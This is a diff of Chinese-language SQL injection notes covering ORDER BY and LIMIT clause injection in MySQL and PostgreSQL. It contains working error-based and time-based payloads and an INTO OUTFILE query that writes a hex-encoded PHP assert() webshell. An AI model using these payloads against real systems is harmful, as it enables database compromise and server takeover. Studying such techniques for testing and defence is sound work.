@@ -184,14 +184,15 @@ secure-file-priv = ""
 
 ### 重点检测
 
-#### 无法使用"预编译语句"的情况 - `order by`
+#### 无法使用"预编译语句"的情况 - `order by`子句
 
-为什么order by无法使用"预编译语句"?
+为什么`order by`无法使用"预编译语句"? 
 ```
-# order by 的正常使用 如
+# MySQL:
+# order by 子句的正常使用 如
 select aid,adenname from sea_myad order by adenname;
 
-# order by 之后 如果使用"预编译语句"  字段名会被加上引号 使order by子句"失效" 即不会对结果进行排序
+# order by 子句之后的字段名 如果使用"预编译语句" 则字段名会被加上引号 从而order by子句"失效" 即不会对结果进行排序
 select aid,adenname from sea_myad order by "adenname";
 ```
 
@@ -234,37 +235,50 @@ mysql> select aid,adenname from sea_myad order by if(1=1,sleep(1),2);
 ```
 
 
-#### 无法使用"预编译语句"的情况 - `limit`
+#### 无法使用"预编译语句"的情况 - `limit`子句
 
-SQL Injections in MySQL LIMIT clause
-* 漏洞场景:SQL语句中`limit`之前有`order by`(无法使用`union select`). 注入点在`limit`子句之后的位置. 如`SELECT freld FROM table WHERE id>0 ORDER BY id LIMIT injection_point`
-* 利用条件:5.0.0<MySQL版本<5.6.6
-* 注意:MySQL版本>=5.7 无法利用. 因为`analyse()`的两个参数都只能为`uint`类型
-* 利用方式1 - 使用`analyse()`函数进行"基于报错的注入".
-* 利用方式2 - 使用`analyse()`函数进行"基于时间的注入". 实测只能用`benchmark` 而不能用`sleep`
-* 利用方式3 - 写入文件. 如果权限足够 可在`limit`之后紧跟`into`写入文件 得到webshell
+* MySQL的`limit`子句注入
+  * 漏洞场景 - MySQL中 当`order by`之后跟了`LIMIT`即二者一起使用时,注入点在`limit`子句之后的位置,该场景无法使用`union`语句进行联合查询.
+  * 实际案例 - `SELECT freld FROM table WHERE id>0 ORDER BY id LIMIT injection_point`
+  * 利用条件 -  5.0.0<MySQL版本<5.6.6   (MySQL版本>=5.7 无法利用. 因为`analyse()`的两个参数都只能为`uint`类型)
 
 ```
-# 利用方式1 - 基于报错的注入
+# MySQL limit子句注入 利用方式1 - 基于报错的注入
+# limit之后可以跟`analyse()`函数
+# 报错函数 extractvalue()等
+
 mysql> SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1
        procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
 ERROR 1105 (HY000): XPATH syntax error: ':5.5.41-0ubuntu0.14.04.1'
 ```
 
 ```
-# 利用方式2 - 基于时间的注入
+# MySQL limit子句注入 利用方式2 - 基于时间的注入
+# limit之后可以跟`analyse()`函数
+# 延时函数 实测只能用`benchmark` 而不能用`sleep`
+
 SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1
 PROCEDURE analyse((select extractvalue(rand(),
 concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
 ```
 
 ```
-# 利用方式3 - 写入文件
+# MySQL limit子句注入 利用方式3 - 写入文件
+# 如果权限足够 可在`limit`之后跟`into`写入文件 得到webshell
+
 # Hex <-> ASCII
 # 3c3f7068702061737365727428245f504f53545b6173617361735d293b3f3e <-> <?php assert($_POST[asasas]);?>
 
 SELECT 1 from mysql.user order by 1 limit 0,1 into outfile '/tmp/s.php' LINES TERMINATED BY 0x3c3f7068702061737365727428245f504f53545b6173617361735d293b3f3e;
 ```
+
+
+* **PostgreSQL**的limit子句注入 可以回显(在MySQL下实测limit之后无法跟ascii函数 无法回显)
+  * 漏洞场景 - PostgreSQL中 当`order by`之后跟了`LIMIT`即二者一起使用时,注入点在`limit`子句之后的位置,该场景无法使用`union`语句进行联合查询.
+  * 实际案例 - `Select * from tbl_albums where page=2 order by album_date asc LIMIT 0,injection_point`
+  * 使用ascii函数将substr函数返回的字符串转换为数字 `Select * from tbl_albums where page=2 order by album_date asc LIMIT 0,ascii(substr((Select version()),1,1))`
+  * 数据回显 - 通过SQL语句执行结果 常体现为页面某种元素的数量(0-127之间),从而计算得到ascii码 <-> 真实字符
+
 
 #### 宽字节注入 - 情况1 数据库使用了GBK编码
 
